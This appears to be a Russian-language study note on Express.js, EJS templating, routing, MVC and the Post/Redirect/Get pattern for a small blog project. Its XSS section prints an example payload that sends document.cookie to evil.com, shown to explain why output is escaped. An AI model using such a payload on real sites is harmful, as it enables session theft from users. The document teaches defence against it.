# Этап 2 — Express.js + EJS + MVC

> Статус: ✅ Завершён | Pet-проект: `02-simple-blog`

---

## 1. Зачем Express, если есть встроенный `http`?

Встроенный `http` — голый инструмент. Чтобы написать сервер с маршрутами, парсингом тела запроса и статикой, нужно много кода вручную (мы это делали в `01-mini-framework`).

Express — это тонкая обёртка над `http`, которая добавляет:
- удобный роутинг
- middleware-систему
- расширенные `req` и `res`
- интеграцию с шаблонизаторами

```ts
import express from 'express';
const app = express();

app.get('/hello', (req, res) => {
  res.send('Hello!');
});

app.listen(3000);
```

`express()` возвращает объект приложения. Под капотом он создаёт `http.createServer` и передаёт туда свой обработчик — точно так же как мы делали вручную.

---

## 2. Middleware — основа Express

Middleware — это функция с сигнатурой `(req, res, next)`, которая выполняется до обработчика маршрута.

```
Запрос
  ↓
middleware 1  →  next()
  ↓
middleware 2  →  next()
  ↓
route handler  →  res.send()
  ↓
Ответ
```

```ts
// Глобальный middleware — применяется ко всем маршрутам
app.use((req, res, next) => {
  console.log(`${req.method} ${req.url}`);
  next(); // передать управление дальше
});

// Middleware для конкретного маршрута
app.get('/admin', checkAuth, (req, res) => {
  res.send('Добро пожаловать');
});
```

Если не вызвать `next()` — цепочка прерывается, ответ не отправится. Если не вызвать `res.send()` в конце — запрос зависнет.

### Встроенные middleware Express:

**`express.urlencoded({ extended: true })`** — парсит тело HTML-форм.

Когда браузер отправляет `<form method="POST">`, данные идут в теле запроса в формате:
```
title=Hello+World&body=Some+text
```
Без этого middleware `req.body` будет `undefined`. С ним — `req.body.title === 'Hello World'`.

`extended: true` означает использовать библиотеку `qs` для парсинга вложенных объектов (`user[name]=Bob`). `extended: false` — только плоские данные.

**`express.json()`** — парсит тело JSON-запросов (для REST API, не для HTML-форм).

**`express.static('public')`** — отдаёт файлы из папки как есть, без обработчиков.

```ts
// если public/ лежит внутри src/
app.use(express.static(path.join(__dirname, 'public')));
// теперь src/public/style.css доступен по URL /style.css
```

---

## 3. app.set — реестр настроек Express

`app.set(key, value)` — хранилище настроек приложения. Некоторые ключи **зарезервированы** и меняют поведение Express:

| Ключ | Что делает |
|------|-----------|
| `'view engine'` | какой шаблонизатор использовать при `res.render()` |
| `'views'` | где искать файлы шаблонов |
| `'trust proxy'` | доверять ли заголовкам прокси (X-Forwarded-For) |
| `'case sensitive routing'` | `/Posts` и `/posts` — разные маршруты? |

Если написать `app.set('my-key', 123)` — ничего не произойдёт, это просто сохранится как кастомная настройка. Прочитать можно через `app.get('my-key')`.

---

## 4. Шаблонизатор EJS

### Зачем нужен?

На сервере нужно генерировать HTML динамически — подставлять данные из базы, условия, циклы. EJS позволяет писать обычный HTML с вставками JS.

### Настройка в Express:

```ts
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views')); // где искать .ejs файлы
```

После этого в обработчиках можно вызывать:
```ts
res.render('posts/index', { posts: [...] });
// Express найдёт src/views/posts/index.ejs и вернёт готовый HTML
```

### Синтаксис EJS:

```html
<!-- Выполнить JS, ничего не выводить -->
<% const title = 'Блог'; %>

<!-- Вывести значение (HTML экранируется — безопасно) -->
<h1><%= title %></h1>

<!-- Вывести HTML без экранирования (осторожно с XSS!) -->
<%- rawHtml %>

<!-- Условие -->
<% if (posts.length === 0) { %>
  <p>Нет статей</p>
<% } %>

<!-- Цикл -->
<% posts.forEach(post => { %>
  <h2><%= post.title %></h2>
<% }) %>

<!-- Подключить другой шаблон (partials) -->
<%- include('../layout/header') %>
```

### Зачем `<%= %>` экранирует HTML?

Защита от XSS. Если пользователь ввёл `<script>alert('hack')</script>` в форму, при выводе через `<%= %>` это превратится в `&lt;script&gt;` — безобидный текст. Через `<%- %>` — выполнится как JS в браузере.

---

## 4. Роутинг в Express

```ts
// Отдельный роутер — изолирует маршруты по теме
const router = express.Router();

router.get('/', handler);          // GET /posts
router.get('/new', handler);       // GET /posts/new
router.post('/', handler);         // POST /posts
router.get('/:id', handler);       // GET /posts/123
router.get('/:id/edit', handler);  // GET /posts/123/edit
router.post('/:id/update', handler);
router.post('/:id/delete', handler);

// Подключить роутер в app.ts с префиксом
app.use('/posts', router);
```

**Порядок маршрутов важен.** Express проверяет их сверху вниз и останавливается на первом совпадении:

```ts
router.get('/new', handler);   // ✅ должен быть ВЫШЕ /:id
router.get('/:id', handler);   // иначе 'new' попадёт сюда как id
```

### Параметры и query:

```ts
// URL: /posts/42
req.params.id  // '42' (всегда строка!)

// URL: /posts?page=2&sort=date
req.query.page  // '2'
req.query.sort  // 'date'
```

### Почему HTML-формы не поддерживают PUT/DELETE?

Спецификация HTML позволяет формам только `GET` и `POST`. Поэтому в SSR-приложениях для обновления и удаления используют POST с уточнением в URL (`/posts/:id/update`, `/posts/:id/delete`).

В REST API (следующий этап) — будем использовать настоящие `PUT`, `PATCH`, `DELETE` через fetch/axios.

---

## 5. MVC — разделение ответственности

### Model

Отвечает только за данные: хранение, получение, изменение. Не знает про HTTP, `req`, `res`, HTML.

```ts
// models/Post.ts
interface Post {
  id: number;
  title: string;
  body: string;
  createdAt: Date;
}

const posts: Post[] = [];
let nextId = 1;

export const PostModel = {
  findAll: (): Post[] => posts,
  findById: (id: number): Post | undefined => posts.find(p => p.id === id),
  create: (data: { title: string; body: string }): Post => { ... },
  update: (id: number, data: Partial<Post>): Post | undefined => { ... },
  delete: (id: number): boolean => { ... },
};
```

Сейчас данные хранятся в памяти (массив). В следующих этапах Model будет работать с БД — но Controller этого не заметит, интерфейс останется тем же.

### Controller

Получает запрос, обращается к Model, отдаёт данные во View. Вся бизнес-логика — здесь.

```ts
// controllers/postController.ts
import { Request, Response } from 'express';
import { PostModel } from '../models/Post';

export const index = (req: Request, res: Response) => {
  const posts = PostModel.findAll();
  res.render('posts/index', { posts });
};

export const create = (req: Request, res: Response) => {
  const { title, body } = req.body;
  PostModel.create({ title, body });
  res.redirect('/posts'); // после POST — всегда redirect (паттерн PRG)
};
```

### View (EJS-шаблон)

Получает данные, рендерит HTML. Никакой логики кроме отображения.

```html
<!-- views/posts/index.ejs -->
<h1>Статьи</h1>
<a href="/posts/new">Написать</a>

<% posts.forEach(post => { %>
  <div>
    <h2><a href="/posts/<%= post.id %>"><%= post.title %></a></h2>
    <p><%= post.createdAt.toLocaleDateString('ru') %></p>
  </div>
<% }) %>
```

### Router

Связывает URL с контроллером. Никакой логики — только маппинг.

```ts
// routes/posts.ts
import { Router } from 'express';
import * as postController from '../controllers/postController';

const router = Router();

router.get('/', postController.index);
router.get('/new', postController.newForm);
router.post('/', postController.create);
// ...

export default router;
```

---

## 6. Паттерн PRG (Post/Redirect/Get)

После успешного POST-запроса — всегда делать `redirect`, а не `render`.

**Проблема без PRG:** пользователь отправил форму (POST /posts), сервер вернул HTML напрямую. Если обновить страницу — браузер повторит POST → создастся дублирующая запись.

**Решение:** POST → обработка → `res.redirect('/posts')` → браузер делает GET → страница загружается. Обновление страницы повторит только GET.

```ts
export const create = (req: Request, res: Response) => {
  PostModel.create(req.body);
  res.redirect('/posts'); // ← всегда redirect после POST
};
```

---

## 8. XSS — атака на практике

**XSS (Cross-Site Scripting)** — внедрение вредоносного JS-кода через пользовательский ввод.

Если вывести данные через `<%- %>` вместо `<%= %>`:

```html
<!-- ❌ уязвимо -->
<h1><%- post.title %></h1>
```

Злоумышленник вводит в форму:
```
<script>fetch('https://evil.com?c=' + document.cookie)</script>
```

Браузер получает это как настоящий HTML и **выполняет** скрипт. Все кто откроет страницу — отправят свои куки (включая сессию администратора) на сторонний сервер.

С `<%= %>` браузер получает экранированный текст:
```html
<h1>&lt;script&gt;alert('XSS')&lt;/script&gt;</h1>
```
Это просто текст — ничего не выполняется.

**Правило:** пользовательские данные — всегда `<%= %>`. `<%- %>` только для `include()` и контента который сам сгенерировал сервер.

---

## 9. Как браузер получает CSS

Доставка статики — это **отдельный HTTP-запрос**. Браузер получает HTML, видит `<link rel="stylesheet" href="/style.css">`, и делает второй запрос за файлом.

```
Браузер → GET /posts     → сервер рендерит EJS → HTML
Браузер → GET /style.css → express.static      → файл как есть
```

`express.static` перехватывает запрос **до маршрутов** и отдаёт файл напрямую — никакого EJS, никакой обработки.

После первой загрузки браузер кеширует CSS — повторные страницы грузят его мгновенно из кеша, без запроса к серверу.

---

## Контрольные вопросы

1. Что произойдёт если в middleware не вызвать `next()`?
2. Почему маршрут `/new` должен быть выше `/:id`?
3. Чем `<%= %>` отличается от `<%- %>`? Когда каждый уместен?
4. Зачем после POST делать redirect (паттерн PRG)?
5. Что такое `req.params` и `req.query` — в чём разница?
6. Почему Model не должна знать про `req` и `res`?
